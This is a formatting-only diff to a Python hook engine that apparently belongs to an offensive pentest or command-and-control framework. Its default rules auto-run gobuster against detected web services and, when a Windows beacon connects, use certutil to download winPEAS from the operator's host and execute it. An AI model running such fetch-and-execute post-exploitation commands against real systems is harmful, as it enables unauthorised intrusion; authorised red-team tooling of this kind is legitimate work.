@@ -134,7 +134,10 @@ DEFAULT_RULES: list[dict[str, Any]] = [
         "name": "auto-web-enum-on-http",
         "trigger": {"event": "service_detected", "port": 80},
         "actions": [
-            {"type": "run_command", "command": "gobuster dir -u http://{rhost}:80 -w /usr/share/wordlists/dirb/common.txt"},
+            {
+                "type": "run_command",
+                "command": "gobuster dir -u http://{rhost}:80 -w /usr/share/wordlists/dirb/common.txt",
+            },
         ],
         "cooldown_seconds": 1800,
     },
@@ -193,7 +196,10 @@ DEFAULT_RULES: list[dict[str, Any]] = [
         "trigger": {"event": "beacon_connected", "platform": "windows"},
         "actions": [
             {"type": "notify", "message": "Foothold obtained on Windows host {ip}. Queuing winPEAS enumeration."},
-            {"type": "run_command", "command": "certutil -urlcache -f http://{lhost}:8000/winPEASx64.exe C:\\Windows\\Temp\\w.exe && C:\\Windows\\Temp\\w.exe"},
+            {
+                "type": "run_command",
+                "command": "certutil -urlcache -f http://{lhost}:8000/winPEASx64.exe C:\\Windows\\Temp\\w.exe && C:\\Windows\\Temp\\w.exe",
+            },
         ],
         "cooldown_seconds": 600,
     },
@@ -226,25 +232,27 @@ DEFAULT_RULES: list[dict[str, Any]] = [
     },
 ]
 
-_VALID_EVENTS = frozenset({
-    "beacon_connected",
-    "beacon_disconnected",
-    "host_discovered",
-    "host_scanned",
-    "host_enumerated",
-    "host_exploited",
-    "host_owned",
-    "service_detected",
-    "credential_captured",
-    "credential_confirmed",
-    "privilege_escalated",
-    "vulnerability_found",
-    "objective_completed",
-    "engagement_started",
-    "engagement_phase_changed",
-    "command_executed",
-    "scan_completed",
-})
+_VALID_EVENTS = frozenset(
+    {
+        "beacon_connected",
+        "beacon_disconnected",
+        "host_discovered",
+        "host_scanned",
+        "host_enumerated",
+        "host_exploited",
+        "host_owned",
+        "service_detected",
+        "credential_captured",
+        "credential_confirmed",
+        "privilege_escalated",
+        "vulnerability_found",
+        "objective_completed",
+        "engagement_started",
+        "engagement_phase_changed",
+        "command_executed",
+        "scan_completed",
+    }
+)
 
 
 class HookEngine:
@@ -358,9 +366,7 @@ class HookEngine:
                     return True
             return False
 
-    def _match_trigger(
-        self, rule_trigger: dict[str, Any], event: str, context: dict[str, Any]
-    ) -> bool:
+    def _match_trigger(self, rule_trigger: dict[str, Any], event: str, context: dict[str, Any]) -> bool:
         """Check if a rule's trigger matches the given event and context.
 
         Supports field-level matching: if the trigger specifies ``port: 80``,
@@ -380,7 +386,7 @@ class HookEngine:
                 continue
 
             if key.endswith("_contains"):
-                base_key = key[:-len("_contains")]
+                base_key = key[: -len("_contains")]
                 ctx_val = str(context.get(base_key, "")).lower()
                 search_val = str(value).lower()
                 if ctx_val.find(search_val) < 0:
@@ -462,9 +468,7 @@ class HookEngine:
         """Execute a shell command via the run_command infra if available."""
         client_id = context.get("client_id")
         if client_id and self._action_handlers.get("run_command"):
-            return self._action_handlers["run_command"](
-                {"command": command, "client_id": client_id}, context
-            )
+            return self._action_handlers["run_command"]({"command": command, "client_id": client_id}, context)
 
         return self._execute_local_command(command)
 
@@ -487,9 +491,7 @@ class HookEngine:
                 reason="conditional hook action, pipes allowed, placeholders quoted",
                 timeout=30,
             )
-            log.info(
-                "[hook] local command: %s -> exit=%d", command, result.returncode
-            )
+            log.info("[hook] local command: %s -> exit=%d", command, result.returncode)
             return result.stdout or result.stderr
         except Exception as exc:
             log.warning("[hook] local command failed: %s -> %s", command, exc)
@@ -542,11 +544,13 @@ class HookEngine:
                 for action in rule.actions:
                     try:
                         result = self._execute_action(action, context)
-                        results.append({
-                            "rule": rule.name,
-                            "action": action,
-                            "result": result,
-                        })
+                        results.append(
+                            {
+                                "rule": rule.name,
+                                "action": action,
+                                "result": result,
+                            }
+                        )
                     except Exception as exc:
                         log.exception(
                             "[hook] Rule %s action %s failed: %s",
@@ -554,11 +558,13 @@ class HookEngine:
                             action.get("type", "?"),
                             exc,
                         )
-                        results.append({
-                            "rule": rule.name,
-                            "action": action,
-                            "error": str(exc),
-                        })
+                        results.append(
+                            {
+                                "rule": rule.name,
+                                "action": action,
+                                "error": str(exc),
+                            }
+                        )
 
         return results
 
